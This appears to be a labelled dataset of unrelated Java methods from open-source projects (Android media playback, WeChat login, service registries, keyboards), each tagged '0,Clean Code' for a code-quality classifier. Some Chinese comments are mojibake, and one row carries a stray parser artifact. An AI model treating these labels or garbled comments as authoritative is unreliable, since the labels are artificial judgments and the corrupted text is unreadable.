  ArrayList<TLRPC.Document> arrayList=recentStickers[type];
  if (type == TYPE_PREMIUM_STICKERS) {
    return new ArrayList<>(recentStickers[type]);
  }
  ArrayList<TLRPC.Document> result=new ArrayList<>(arrayList.subList(0,Math.min(arrayList.size(),20)));
  if (firstEmpty && !result.isEmpty() && !StickersAlert.DISABLE_STICKER_EDITOR) {
    result.add(0,new TLRPC.TL_documentEmpty());
  }
  return new ArrayList<>(arrayList.subList(0,Math.min(arrayList.size(),NekoConfig.maxRecentStickerCount.Int() + padding)));
}",0,Clean Code
"/** 
 * 鎺ユ敹寰俊鐨勪簨浠舵秷鎭 https://developers.weixin.qq.com/doc/offiaccount/Basic_Information/Access_Overview.html 涓存椂缁欏井淇℃湇鍔″彿鐧诲綍浣跨敤锛屾甯告秷鎭帹閫佸钩鍙颁笉浼氭湁姝ゆ帴鍙
 * @return
 */
@RequestMapping(value=""/receipt"",produces={CommonConstant.CONTENT_TYPE_XML}) @ApiOperation(""/鎺ユ敹寰俊鐨勪簨浠舵秷鎭"") public String receiptMessage(HttpServletRequest request){
  try {
    WeChatLoginConfig configService=loginUtils.getLoginConfig();
    if (Objects.isNull(configService)) {
      return RespStatusEnum.DO_NOT_NEED_LOGIN.getMsg();
    }
    WxMpService wxMpService=configService.getOfficialAccountLoginService();
    String echoStr=request.getParameter(OfficialAccountParamConstant.ECHO_STR);
    String signature=request.getParameter(OfficialAccountParamConstant.SIGNATURE);
    String nonce=request.getParameter(OfficialAccountParamConstant.NONCE);
    String timestamp=request.getParameter(OfficialAccountParamConstant.TIMESTAMP);
    if (CharSequenceUtil.isNotBlank(echoStr)) {
      return echoStr;
    }
    if (!wxMpService.checkSignature(timestamp,nonce,signature)) {
      return RespStatusEnum.CLIENT_BAD_PARAMETERS.getMsg();
    }
    String encryptType=CharSequenceUtil.isBlank(request.getParameter(OfficialAccountParamConstant.ENCRYPT_TYPE)) ? OfficialAccountParamConstant.RAW : request.getParameter(OfficialAccountParamConstant.ENCRYPT_TYPE);
    if (OfficialAccountParamConstant.RAW.equals(encryptType)) {
      WxMpXmlMessage inMessage=WxMpXmlMessage.fromXml(request.getInputStream());
      log.info(""raw inMessage:{}"",JSON.toJSONString(inMessage));
      WxMpXmlOutMessage outMessage=configService.getWxMpMessageRouter().route(inMessage);
      return outMessage.toXml();
    }
 else     if (OfficialAccountParamConstant.AES.equals(encryptType)) {
      String msgSignature=request.getParameter(OfficialAccountParamConstant.MSG_SIGNATURE);
      WxMpXmlMessage inMessage=WxMpXmlMessage.fromEncryptedXml(request.getInputStream(),configService.getConfig(),timestamp,nonce,msgSignature);
      log.info(""aes inMessage:{}"",JSON.toJSONString(inMessage));
      WxMpXmlOutMessage outMessage=configService.getWxMpMessageRouter().route(inMessage);
      return outMessage.toEncryptedXml(configService.getConfig());
    }
    return RespStatusEnum.SUCCESS.getMsg();
  }
 catch (  Exception e) {
    log.error(""OfficialAccountController#receiptMessage fail:{}"",Throwables.getStackTraceAsString(e));
    return RespStatusEnum.SERVICE_ERROR.getMsg();
  }
}
",0,Clean Code
"private void placeKeyPreview(final Key key,final KeyPreviewView keyPreviewView,final KeyboardIconsSet iconsSet,final KeyDrawParams drawParams,final int fullKeyboardViewWidth,final int[] originCoords){
  keyPreviewView.setPreviewVisual(key,iconsSet,drawParams);
  keyPreviewView.measure(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
  mParams.setGeometry(keyPreviewView);
  final int previewWidth=keyPreviewView.getMeasuredWidth();
  final int previewHeight=keyPreviewView.getMeasuredHeight();
  final int keyDrawWidth=key.getDrawWidth();
  final int keyPreviewPosition;
  int previewX=key.getDrawX() - (previewWidth - keyDrawWidth) / 2 + CoordinateUtils.x(originCoords);
  if (previewX < 0) {
    previewX=0;
    keyPreviewPosition=KeyPreviewView.POSITION_LEFT;
  }
 else   if (previewX > fullKeyboardViewWidth - previewWidth) {
    previewX=fullKeyboardViewWidth - previewWidth;
    keyPreviewPosition=KeyPreviewView.POSITION_RIGHT;
  }
 else {
    keyPreviewPosition=KeyPreviewView.POSITION_MIDDLE;
  }
  final boolean hasPopupKeys=(key.getPopupKeys() != null);
  keyPreviewView.setPreviewBackground(hasPopupKeys,keyPreviewPosition);
  final Colors colors=Settings.getInstance().getCurrent().mColors;
  colors.setBackground(keyPreviewView,ColorType.KEY_PREVIEW);
  final int previewY=key.getY() - previewHeight + key.getHeight() - mParams.mPreviewOffset + CoordinateUtils.y(originCoords);
  ViewLayoutUtils.placeViewAt(keyPreviewView,previewX,previewY,previewWidth,previewHeight);
  keyPreviewView.setPivotX(previewWidth / 2.0f);
  keyPreviewView.setPivotY(previewHeight);
}",0,Clean Code
"@Override public void onFailure(EventSource eventSource,Throwable t,Response response){
  try {
    if (Objects.isNull(response)) {
      String message=t.getMessage();
      Message sseMessage=new Message();
      sseMessage.setContent(message);
      sseEmitter.send(SseEmitter.event().id(""[ERROR]"").data(sseMessage));
      sseEmitter.send(SseEmitter.event().id(""[DONE]"").data(""[DONE]""));
      sseEmitter.complete();
      return;
    }
    ResponseBody body=response.body();
    String bodyString=Objects.nonNull(t) ? t.getMessage() : """";
    if (Objects.nonNull(body)) {
      bodyString=body.string();
      if (StringUtils.isBlank(bodyString) && Objects.nonNull(t)) {
        bodyString=t.getMessage();
      }
      log.error(""Tongyi Chat AI sse response锛歿}"",bodyString);
    }
 else {
      log.error(""Tongyi Chat AI sse response锛歿}锛宔rror锛歿}"",response,t);
    }
    eventSource.cancel();
    Message message=new Message();
    message.setContent(""Tongyi Chat AI error锛�"" + bodyString);
    sseEmitter.send(SseEmitter.event().id(""[ERROR]"").data(message));
    sseEmitter.send(SseEmitter.event().id(""[DONE]"").data(""[DONE]""));
    sseEmitter.complete();
  }
 catch (  Exception exception) {
    log.error(""Tongyi Chat AI send data error:"",exception);
  }
}
",0,Clean Code
"/** 
 * Compares this object against the specified object. The result is  {@code true} if and only if the argument isnot  {@code null} and it represents the same proxy asthis object. <p> Two instances of  {@code Proxy} represent the sameaddress if both the SocketAddresses and type are equal.
 * @param obj   the object to compare against.
 * @return  {@code true} if the objects are the same;{@code false} otherwise.
 * @see InetSocketAddress#equals(Object)
 */
public final boolean equals(Object obj){
  if (obj == null || !(obj instanceof Proxy))   return false;
  Proxy p=(Proxy)obj;
  if (p.type() == type()) {
    if (address() == null) {
      return (p.address() == null);
    }
 else     return address().equals(p.address());
  }
  return false;
}
",0,Clean Code
"private boolean isTouchPointInView(View view,int x,int y){
  if (view.isClickable() && y >= view.getTop() && y <= view.getBottom() && x >= view.getLeft() && x <= view.getRight()) {
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public void onPrepared(MediaPeriod preparedPeriod){
  childrenPendingPreparation.remove(preparedPeriod);
  if (!childrenPendingPreparation.isEmpty()) {
    return;
  }
  int totalTrackGroupCount=0;
  for (  MediaPeriod period : periods) {
    totalTrackGroupCount+=period.getTrackGroups().length;
  }
  TrackGroup[] trackGroupArray=new TrackGroup[totalTrackGroupCount];
  int trackGroupIndex=0;
  for (  MediaPeriod period : periods) {
    TrackGroupArray periodTrackGroups=period.getTrackGroups();
    int periodTrackGroupCount=periodTrackGroups.length;
    for (int j=0; j < periodTrackGroupCount; j++) {
      trackGroupArray[trackGroupIndex++]=periodTrackGroups.get(j);
    }
  }
  trackGroups=new TrackGroupArray(trackGroupArray);
  callback.onPrepared(this);
}",0,Clean Code
"@SuppressWarnings(""WeakerAccess"") void dispatchChildSelectedAndPositioned(){
  if (!hasOnChildViewHolderSelectedListener()) {
    return;
  }
  if (TRACE)   TraceCompat.beginSection(""onChildSelectedAndPositioned"");
  View view=mFocusPosition == NO_POSITION ? null : findViewByPosition(mFocusPosition);
  if (view != null) {
    RecyclerView.ViewHolder vh=mBaseGridView.getChildViewHolder(view);
    fireOnChildViewHolderSelectedAndPositioned(mBaseGridView,vh,mFocusPosition,mSubFocusPosition);
  }
 else {
    if (mChildSelectedListener != null) {
      mChildSelectedListener.onChildSelected(mBaseGridView,null,NO_POSITION,NO_ID);
    }
    fireOnChildViewHolderSelectedAndPositioned(mBaseGridView,null,NO_POSITION,0);
  }
  if (TRACE)   TraceCompat.endSection();
}",0,Clean Code
"@Override @SneakyThrows public Expression getSqlSegment(Expression where,String mappedStatementId){
  Class<?> clazz=Class.forName(mappedStatementId.substring(0,mappedStatementId.lastIndexOf(StringPool.DOT)));
  String methodName=mappedStatementId.substring(mappedStatementId.lastIndexOf(StringPool.DOT) + 1);
  Method[] methods=clazz.getDeclaredMethods();
  for (  Method method : methods) {
    DataPermission annotation=method.getAnnotation(DataPermission.class);
    if (annotation == null) {
      return where;
    }
    if (SecurityUtils.isRoot()) {
      return where;
    }
    if (ObjectUtils.isNotEmpty(annotation) && (method.getName().equals(methodName) || (method.getName() + ""_COUNT"").equals(methodName))) {
      return dataScopeFilter(annotation.deptAlias(),annotation.deptIdColumnName(),annotation.userAlias(),annotation.userIdColumnName(),where);
    }
  }
  return where;
}",0,Clean Code
"private void scanQr(){
  QRScanDialog qrScanDialog=new QRScanDialog();
  qrScanDialog.initOwner(getDialogPane().getScene().getWindow());
  Optional<QRScanDialog.Result> optionalResult=qrScanDialog.showAndWait();
  if (optionalResult.isPresent()) {
    QRScanDialog.Result result=optionalResult.get();
    if (result.payload != null) {
      signature.clear();
      signature.appendText(result.payload);
    }
 else     if (result.exception != null) {
      log.error(""Error scanning QR"",result.exception);
      showErrorDialog(""Error scanning QR"",result.exception.getMessage());
    }
 else {
      AppServices.showErrorDialog(""Invalid QR Code"",""Cannot parse QR code into a signature."");
    }
  }
}
",0,Clean Code
"private void searchData(AbsXml absXml){
  if (absXml != null && absXml.movie != null && absXml.movie.videoList != null && absXml.movie.videoList.size() > 0) {
    List<Movie.Video> data=new ArrayList<>();
    for (    Movie.Video video : absXml.movie.videoList) {
      if (video.sourceKey.equals(sourceKey) && video.id.equals(vodId))       continue;
      data.add(video);
    }
    quickSearchData.addAll(data);
    EventBus.getDefault().post(new RefreshEvent(RefreshEvent.TYPE_QUICK_SEARCH,data));
  }
}",0,Clean Code
"@Override public void run(){
  try {
    if (RunningConfig.getServerPort() <= 0) {
      return;
    }
    checkDistroHeartbeat();
    int weight=Runtime.getRuntime().availableProcessors() / 2;
    if (weight <= 0) {
      weight=1;
    }
    long curTime=System.currentTimeMillis();
    String status=LOCALHOST_SITE + ""#"" + NetUtils.localServer()+ ""#""+ curTime+ ""#""+ weight+ ""\r\n"";
    onReceiveServerStatus(status);
    List<Server> allServers=getServers();
    if (!contains(NetUtils.localServer())) {
      Loggers.SRV_LOG.error(""local ip is not in serverlist, ip: {}, serverlist: {}"",NetUtils.localServer(),allServers);
      return;
    }
    if (allServers.size() > 0 && !NetUtils.localServer().contains(UtilsAndCommons.LOCAL_HOST_IP)) {
      for (      com.alibaba.nacos.naming.cluster.servers.Server server : allServers) {
        if (server.getKey().equals(NetUtils.localServer())) {
          continue;
        }
        Message msg=new Message();
        msg.setData(status);
        synchronizer.send(server.getKey(),msg);
      }
    }
  }
 catch (  Exception e) {
    Loggers.SRV_LOG.error(""[SERVER-STATUS] Exception while sending server status"",e);
  }
 finally {
    GlobalExecutor.registerServerStatusReporter(this,switchDomain.getServerStatusSynchronizationPeriodMillis());
  }
}",0,Clean Code
"private void confirmDelete(ActionMode mode){
  AlertDialog.Builder builder=new AlertDialog.Builder(requireContext());
  builder.setMessage(R.string.rules_delete_confirm);
  builder.setCancelable(true);
  builder.setPositiveButton(R.string.yes,(dialog,which) -> {
    if (mSelected.size() >= mAdapter.getCount()) {
      mAdapter.clear();
      mList.clear();
      mList.save();
    }
 else {
      for (      MatchList.Rule item : mSelected)       mAdapter.remove(item);
      updateListFromAdapter();
    }
    mode.finish();
    mListInfo.reloadRules();
    recheckListSize();
  }
);
  builder.setNegativeButton(R.string.no,(dialog,whichButton) -> {
  }
);
  final AlertDialog alert=builder.create();
  alert.setCanceledOnTouchOutside(true);
  alert.show();
}
",0,Clean Code
"/** 
 * Outputs the encryption data for the current sample.
 * @return The number of written bytes.
 */
public int outputSampleEncryptionData(){
  TrackEncryptionBox encryptionBox=getEncryptionBoxIfEncrypted();
  if (encryptionBox == null) {
    return 0;
  }
  ParsableByteArray initializationVectorData;
  int vectorSize;
  if (encryptionBox.perSampleIvSize != 0) {
    initializationVectorData=fragment.sampleEncryptionData;
    vectorSize=encryptionBox.perSampleIvSize;
  }
 else {
    byte[] initVectorData=encryptionBox.defaultInitializationVector;
    defaultInitializationVector.reset(initVectorData,initVectorData.length);
    initializationVectorData=defaultInitializationVector;
    vectorSize=initVectorData.length;
  }
  boolean subsampleEncryption=fragment.sampleHasSubsampleEncryptionTable(currentSampleIndex);
  encryptionSignalByte.data[0]=(byte)(vectorSize | (subsampleEncryption ? 0x80 : 0));
  encryptionSignalByte.setPosition(0);
  output.sampleData(encryptionSignalByte,1);
  output.sampleData(initializationVectorData,vectorSize);
  if (!subsampleEncryption) {
    return 1 + vectorSize;
  }
  ParsableByteArray subsampleEncryptionData=fragment.sampleEncryptionData;
  int subsampleCount=subsampleEncryptionData.readUnsignedShort();
  subsampleEncryptionData.skipBytes(-2);
  int subsampleDataLength=2 + 6 * subsampleCount;
  output.sampleData(subsampleEncryptionData,subsampleDataLength);
  return 1 + vectorSize + subsampleDataLength;
}",0,Clean Code
"/** 
 * 连接服务器 userId和token都不允许为空 需要注意token跟clientId是强依赖的，一定要调用getClientId获取到clientId，然后用这个clientId获取token，这样connect才能成功，如果随便使用一个clientId获取到的token将无法链接成功。 另外不能多次connect，如果需要切换用户请先disconnect，然后3秒钟之后再connect（如果是用户手动登录可以不用等，因为用户操作很难3秒完成，如果程序自动切换请等3秒）
 * @param userId
 * @param token
 * @return 返回上一次活动时间。如果间隔时间较长，可以加个第一次登录的等待提示界面，在等待时同步所有的用户信息/群组信息/频道信息等。
 */
public long connect(String userId,String token){
  if (TextUtils.isEmpty(userId) || TextUtils.isEmpty(token) || TextUtils.isEmpty(SERVER_HOST)) {
    throw new IllegalArgumentException(""userId, token and im_server_host must not be empty!"");
  }
  this.userId=userId;
  this.token=token;
  if (mClient != null) {
    try {
      Log.d(TAG,""connect "" + userId + "" ""+ token);
      return mClient.connect(this.userId,this.token);
    }
 catch (    RemoteException e) {
      e.printStackTrace();
    }
  }
 else {
    Log.d(TAG,""Mars service not start yet!"");
  }
  return 0;
}",0,Clean Code
"@Override public boolean registry(Set<String> keys,String value){
  if (keys == null || keys.size() == 0 || value == null || value.trim().length() == 0) {
    return false;
  }
  for (  String key : keys) {
    TreeSet<String> values=registryData.get(key);
    if (values == null) {
      values=new TreeSet<>();
      registryData.put(key,values);
    }
    values.add(value);
  }
  return true;
}",0,Clean Code
"@Override public void execute(CommandContext<GeyserCommandSource> context){
  GeyserCommandSource source=context.sender();
  String bedrockVersions;
  List<BedrockCodec> supportedCodecs=GameProtocol.SUPPORTED_BEDROCK_CODECS;
  if (supportedCodecs.size() > 1) {
    bedrockVersions=supportedCodecs.get(0).getMinecraftVersion() + "" - "" + supportedCodecs.get(supportedCodecs.size() - 1).getMinecraftVersion();
  }
 else {
    bedrockVersions=GameProtocol.SUPPORTED_BEDROCK_CODECS.get(0).getMinecraftVersion();
  }
  String javaVersions;
  List<String> supportedJavaVersions=GameProtocol.getJavaVersions();
  if (supportedJavaVersions.size() > 1) {
    javaVersions=supportedJavaVersions.get(0) + "" - "" + supportedJavaVersions.get(supportedJavaVersions.size() - 1);
  }
 else {
    javaVersions=supportedJavaVersions.get(0);
  }
  source.sendMessage(GeyserLocale.getPlayerLocaleString(""geyser.commands.version.version"",source.locale(),GeyserImpl.NAME,GeyserImpl.VERSION,javaVersions,bedrockVersions));
  if (!GeyserImpl.getInstance().isProductionEnvironment() || (!source.isConsole() && geyser.getPlatformType() == PlatformType.STANDALONE)) {
    return;
  }
  if (GeyserImpl.IS_DEV) {
    source.sendMessage(GeyserLocale.getPlayerLocaleString(""geyser.core.dev_build"",source.locale(),""https://discord.gg/geysermc""));
    return;
  }
  source.sendMessage(GeyserLocale.getPlayerLocaleString(""geyser.commands.version.checking"",source.locale()));
  try {
    int buildNumber=this.geyser.buildNumber();
    JsonNode response=WebUtils.getJson(""https://download.geysermc.org/v2/projects/geyser/versions/latest/builds/latest"");
    int latestBuildNumber=response.get(""build"").asInt();
    if (latestBuildNumber == buildNumber) {
      source.sendMessage(GeyserLocale.getPlayerLocaleString(""geyser.commands.version.no_updates"",source.locale()));
      return;
    }
    source.sendMessage(GeyserLocale.getPlayerLocaleString(""geyser.commands.version.outdated"",source.locale(),(latestBuildNumber - buildNumber),""https://geysermc.org/download""));
  }
 catch (  IOException e) {
    GeyserImpl.getInstance().getLogger().error(GeyserLocale.getLocaleStringLog(""geyser.commands.version.failed""),e);
    source.sendMessage(ChatColor.RED + GeyserLocale.getPlayerLocaleString(""geyser.commands.version.failed"",source.locale()));
  }
}",0,Clean Code
"public Create_local_temp_table_stmtContext create_local_temp_table_stmt(){
  return getRuleContext(Create_local_temp_table_stmtContext.class,0);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@955762",0,Clean Code
"private String assembleReleases(){
  StringBuilder sb=new StringBuilder();
  if (releasesUpdatePolicy != null || releasesEnabled != null || releasesChecksumPolicy != null) {
    sb.append(""<releases>"");
    if (releasesEnabled != null) {
      sb.append(assembleTagWithValue(""enabled"",String.valueOf(releasesEnabled.booleanValue())));
    }
    if (releasesUpdatePolicy != null) {
      sb.append(assembleTagWithValue(""updatePolicy"",releasesUpdatePolicy));
    }
    if (releasesChecksumPolicy != null) {
      sb.append(assembleTagWithValue(""checksumPolicy"",releasesChecksumPolicy));
    }
    sb.append(""</releases>\n"");
  }
  return sb.toString();
}
",0,Clean Code
"private int peekId3Header(ExtractorInput input) throws IOException, InterruptedException {
  int firstFramePosition=0;
  while (true) {
    input.peekFully(scratch.data,0,10);
    scratch.setPosition(0);
    if (scratch.readUnsignedInt24() != ID3_TAG) {
      break;
    }
    scratch.skipBytes(3);
    int length=scratch.readSynchSafeInt();
    firstFramePosition+=10 + length;
    input.advancePeekPosition(length);
  }
  input.resetPeekPosition();
  input.advancePeekPosition(firstFramePosition);
  if (this.firstFramePosition == C.POSITION_UNSET) {
    this.firstFramePosition=firstFramePosition;
  }
  return firstFramePosition;
}",0,Clean Code
"private void computePreviewDrawingParams(int drawableSize,int totalSize){
  if (mIntrinsicIconSize != drawableSize || mTotalWidth != totalSize || mPrevTopPadding != mIcon.getPaddingTop()) {
    mIntrinsicIconSize=drawableSize;
    mTotalWidth=totalSize;
    mPrevTopPadding=mIcon.getPaddingTop();
    mIcon.mBackground.setup(mIcon.getContext(),mIcon.mActivity,mIcon,mTotalWidth,mIcon.getPaddingTop());
    mIcon.mPreviewLayoutRule.init(mIcon.mBackground.previewSize,mIntrinsicIconSize,Utilities.isRtl(mIcon.getResources()));
    updatePreviewItems(false);
  }
}
",0,Clean Code
"public static String[] getMinecraftJVMArgs(String versionName,File gameDir){
  JMinecraftVersionList.Version versionInfo=Tools.getVersionInfo(versionName,true);
  if (versionInfo.inheritsFrom == null || versionInfo.arguments == null || versionInfo.arguments.jvm == null) {
    return new String[0];
  }
  Map<String,String> varArgMap=new ArrayMap<>();
  varArgMap.put(""classpath_separator"","":"");
  varArgMap.put(""library_directory"",DIR_HOME_LIBRARY);
  varArgMap.put(""version_name"",versionInfo.id);
  varArgMap.put(""natives_directory"",Tools.NATIVE_LIB_DIR);
  List<String> minecraftArgs=new ArrayList<>();
  if (versionInfo.arguments != null) {
    for (    Object arg : versionInfo.arguments.jvm) {
      if (arg instanceof String) {
        minecraftArgs.add((String)arg);
      }
    }
  }
  return JSONUtils.insertJSONValueList(minecraftArgs.toArray(new String[0]),varArgMap);
}",0,Clean Code
"private void refreshService() throws ApiException {
  List<V1Service> serviceList=K8sUtil.listServiceForAllNamespaces(""pluginType=CLUSTER"");
  Map<String,String> serviceMap=new HashMap<>(0);
  for (  V1Service service : serviceList) {
    try {
      String serviceEndpoint=K8sUtil.getServiceEndpoint(service).get(0);
      String accountType=K8sUtil.getServiceLabel(service,""accountType"");
      serviceMap.put(accountType,serviceEndpoint);
    }
 catch (    Exception e) {
      log.error("""",e);
    }
  }
  this.serviceMap=serviceMap;
}",0,Clean Code
"public void login(T t,Function<T,Authentication> callback){
  if (!isInit || null == loginModelClass || null == authenticationManager) {
    throw new RuntimeException(""LoginHandler 鏈垵濮嬪寲"");
  }
  ServletRequestAttributes attributes=(ServletRequestAttributes)RequestContextHolder.getRequestAttributes();
  if (null == attributes) {
    throw new RuntimeException(""ServletRequest 鏈幏鍙�"");
  }
  HttpServletRequest request=attributes.getRequest();
  HttpServletResponse response=attributes.getResponse();
  if (null == callback) {
    AuthServiceException authException=new AuthServiceException(AuthErrorCodeEnum.AUTH_SERVICE_NOT_FIND_HANDLE);
    this.fireFailureEvent(t,request,response,authException);
    return;
  }
  try {
    this.fireBeforeEvent(t);
    Authentication authenticate=authenticationManager.authenticate(callback.apply(t));
    this.fireSuccessEvent(t,authenticate,request,response);
  }
 catch (  Exception e) {
    this.fireFailureEvent(t,request,response,e);
  }
}
",0,Clean Code
"@Override public boolean intersectsBB(double minX,double minY,double minZ,double maxX,double maxY,double maxZ){
  minX-=this.x;
  minY-=this.y;
  minZ-=this.z;
  maxX-=this.x;
  maxY-=this.y;
  maxZ-=this.z;
  double[] frustum=this.frustum;
  for (int i=0; i < 6; i++) {
    int off=i * 4;
    if (dot(frustum,off,minX,minY,minZ) <= 0.0d && dot(frustum,off,maxX,minY,minZ) <= 0.0d && dot(frustum,off,minX,maxY,minZ) <= 0.0d && dot(frustum,off,maxX,maxY,minZ) <= 0.0d && dot(frustum,off,minX,minY,maxZ) <= 0.0d && dot(frustum,off,maxX,minY,maxZ) <= 0.0d && dot(frustum,off,minX,maxY,maxZ) <= 0.0d && dot(frustum,off,maxX,maxY,maxZ) <= 0.0d) {
      return false;
    }
  }
  return true;
}",0,Clean Code
"/** 
 * Returns a value in a score system compliant with the CSS Specificity rules.
 * @see <a href=""https://www.w3.org/TR/CSS2/cascade.html"">CSS Cascading</a>The score works as follows: <ul> <li> Id match adds 0x40000000 to the score. <li> Each class and voice match adds 4 to the score. <li> Tag matching adds 2 to the score. <li> Universal selector matching scores 1. </ul>
 * @param id The id of the cue if present, {@code null} otherwise.
 * @param tag Name of the tag, {@code null} if it refers to the entire cue.
 * @param classes An array containing the classes the tag belongs to. Must not be null.
 * @param voice Annotated voice if present, {@code null} otherwise.
 * @return The score of the match, zero if there is no match.
 */
public int getSpecificityScore(String id,String tag,String[] classes,String voice){
  if (targetId.isEmpty() && targetTag.isEmpty() && targetClasses.isEmpty()&& targetVoice.isEmpty()) {
    return tag.isEmpty() ? 1 : 0;
  }
  int score=0;
  score=updateScoreForMatch(score,targetId,id,0x40000000);
  score=updateScoreForMatch(score,targetTag,tag,2);
  score=updateScoreForMatch(score,targetVoice,voice,4);
  if (score == -1 || !Arrays.asList(classes).containsAll(targetClasses)) {
    return 0;
  }
 else {
    score+=targetClasses.size() * 4;
  }
  return score;
}",0,Clean Code
"/** 
 * 浜х敓涓嬩竴涓狪D
 * @return long
 */
public static synchronized long nextId(){
  long currStamp=getNewStamp();
  if (currStamp < lastStamp) {
    throw new RuntimeException(""鏃堕挓浜嬩欢鍑虹幇鍊掗��锛屾嫆缁濈敓鎴� ID"");
  }
  if (currStamp == lastStamp) {
    sequence=(sequence + 1) & MAX_SEQUENCE;
    if (sequence == 0L) {
      currStamp=getNextMill();
    }
  }
 else {
    sequence=0L;
  }
  lastStamp=currStamp;
  return (currStamp - START_STAMP) << TIMESTAMP_LEFT | datacenterId << DATACENTER_LEFT | machineId << MACHINE_LEFT | sequence;
}",0,Clean Code
"public void updateImage(){
  final ImageDownloader downloader=new ImageDownloader(getContext());
  downloader.setTextureFormat(mFormat);
  if (!mIsImageSet && mPlaceholderSourceMap != null && mSourceMap != null) {
    mPlaceholderListener=new PlaceholderImageDownloadListener(downloader);
    downloader.getImageAsync(mPlaceholderSourceMap,mPlaceholderListener);
  }
 else {
    downloadSourceImage(downloader);
  }
}
",0,Clean Code
"@Override public List<Proxy> select(URI uri){
  if (proxy == null || hosts == null || hosts.isEmpty() || uri.getHost() == null || ""127.0.0.1"".equals(uri.getHost()))   return Collections.singletonList(Proxy.NO_PROXY);
  for (  String host : hosts)   if (Util.containOrMatch(uri.getHost(),host))   return Collections.singletonList(proxy);
  return Collections.singletonList(Proxy.NO_PROXY);
}",0,Clean Code
"@Override protected List<BakedQuad> getCroppedQuads(BlockState state,Direction side,RandomSource rand,BlockState material,ModelData wrappedData,RenderType renderType){
  BakedModel model=getModelOf(material);
  List<BakedQuad> superQuads=originalModel.getQuads(state,side,rand,wrappedData,renderType);
  TextureAtlasSprite targetSprite=model.getParticleIcon(wrappedData);
  boolean vertical=state.getValue(CopycatPanelBlock.FACING).getAxis() == Axis.Y;
  if (side != null && (vertical || side.getAxis() == Axis.Y)) {
    List<BakedQuad> templateQuads=model.getQuads(material,null,rand,wrappedData,renderType);
    for (int i=0; i < templateQuads.size(); i++) {
      BakedQuad quad=templateQuads.get(i);
      if (quad.getDirection() != Direction.UP)       continue;
      targetSprite=quad.getSprite();
      break;
    }
  }
  if (targetSprite == null)   return superQuads;
  List<BakedQuad> quads=new ArrayList<>();
  for (int i=0; i < superQuads.size(); i++) {
    BakedQuad quad=superQuads.get(i);
    TextureAtlasSprite original=quad.getSprite();
    BakedQuad newQuad=BakedQuadHelper.clone(quad);
    int[] vertexData=newQuad.getVertices();
    for (int vertex=0; vertex < 4; vertex++) {
      BakedQuadHelper.setU(vertexData,vertex,targetSprite.getU(SpriteShiftEntry.getUnInterpolatedU(original,BakedQuadHelper.getU(vertexData,vertex))));
      BakedQuadHelper.setV(vertexData,vertex,targetSprite.getV(SpriteShiftEntry.getUnInterpolatedV(original,BakedQuadHelper.getV(vertexData,vertex))));
    }
    quads.add(newQuad);
  }
  return quads;
}",0,Clean Code
"@Override public void commit() throws SQLException {
  if (this.connection != null && !this.isConnectionTransactional && !this.autoCommit) {
    this.connection.commit();
  }
}
",0,Clean Code
"private static String parsePropertyValue(ParsableByteArray input,StringBuilder stringBuilder){
  StringBuilder expressionBuilder=new StringBuilder();
  String token;
  int position;
  boolean expressionEndFound=false;
  while (!expressionEndFound) {
    position=input.getPosition();
    token=parseNextToken(input,stringBuilder);
    if (token == null) {
      return null;
    }
    if (RULE_END.equals(token) || "";"".equals(token)) {
      input.setPosition(position);
      expressionEndFound=true;
    }
 else {
      expressionBuilder.append(token);
    }
  }
  return expressionBuilder.toString();
}
",0,Clean Code
"/** 
 * Returns an expression that deserialize <code>mapData</code> as a java map. 
 */
protected Expression deserializeForMap(Expression mapData,TypeRef<?> typeRef){
  Expression javaMap=newMap(typeRef);
  @SuppressWarnings(""unchecked"") TypeRef<?> supertype=((TypeRef<? extends Map<?,?>>)typeRef).getSupertype(Map.class);
  TypeRef<?> keySetType=supertype.resolveType(TypeUtils.KEY_SET_RETURN_TYPE);
  TypeRef<?> keysType=TypeUtils.getCollectionType(keySetType);
  TypeRef<?> valuesType=supertype.resolveType(TypeUtils.VALUES_RETURN_TYPE);
  Expression keyArray=new Invoke(mapData,""keyArray"",binaryArrayTypeToken,false);
  Expression valueArray=new Invoke(mapData,""valueArray"",binaryArrayTypeToken,false);
  Expression keyJavaArray;
  Expression valueJavaArray;
  if (TypeUtils.ITERABLE_TYPE.isSupertypeOf(keysType)) {
    keyJavaArray=deserializeForCollection(keyArray,keysType);
  }
 else {
    keyJavaArray=deserializeForArray(keyArray,keysType);
  }
  if (TypeUtils.ITERABLE_TYPE.isSupertypeOf(valuesType)) {
    valueJavaArray=deserializeForCollection(valueArray,valuesType);
  }
 else {
    valueJavaArray=deserializeForArray(valueArray,valuesType);
  }
  ZipForEach put=new ZipForEach(keyJavaArray,valueJavaArray,(i,key,value) -> new If(ExpressionUtils.notNull(key),new Invoke(javaMap,""put"",key,value)));
  return new ListExpression(javaMap,put,javaMap);
}
",0,Clean Code
"@Override public void render(long positionUs,long elapsedRealtimeUs) throws ExoPlaybackException {
  if (isEnded) {
    return;
  }
  playbackPositionUs=positionUs;
  while (lastSamplePositionUs < positionUs + SOURCE_READAHEAD_US) {
    formatHolder.format=null;
    buffer.clear();
    int result=readSource(formatHolder,buffer,false);
    if (result == C.RESULT_FORMAT_READ) {
      formatReadCount++;
      assertThat(expectedFormats).contains(formatHolder.format);
      onFormatChanged(formatHolder.format);
    }
 else     if (result == C.RESULT_BUFFER_READ) {
      if (buffer.isEndOfStream()) {
        isEnded=true;
        return;
      }
      lastSamplePositionUs=buffer.timeUs;
      sampleBufferReadCount++;
      onBufferRead();
    }
 else {
      Assertions.checkState(result == C.RESULT_NOTHING_READ);
      return;
    }
  }
}
",0,Clean Code
"/** 
 * @param castContext The context from which the cast session is obtained.
 */
public CastPlayer(CastContext castContext){
  this.castContext=castContext;
  timelineTracker=new CastTimelineTracker();
  period=new Timeline.Period();
  statusListener=new StatusListener();
  seekResultCallback=new SeekResultCallback();
  listeners=new CopyOnWriteArrayList<>();
  notificationsBatch=new ArrayList<>();
  ongoingNotificationsTasks=new ArrayDeque<>();
  SessionManager sessionManager=castContext.getSessionManager();
  sessionManager.addSessionManagerListener(statusListener,CastSession.class);
  CastSession session=sessionManager.getCurrentCastSession();
  remoteMediaClient=session != null ? session.getRemoteMediaClient() : null;
  playbackState=STATE_IDLE;
  repeatMode=REPEAT_MODE_OFF;
  currentTimeline=CastTimeline.EMPTY_CAST_TIMELINE;
  currentTrackGroups=TrackGroupArray.EMPTY;
  currentTrackSelection=EMPTY_TRACK_SELECTION_ARRAY;
  pendingSeekWindowIndex=C.INDEX_UNSET;
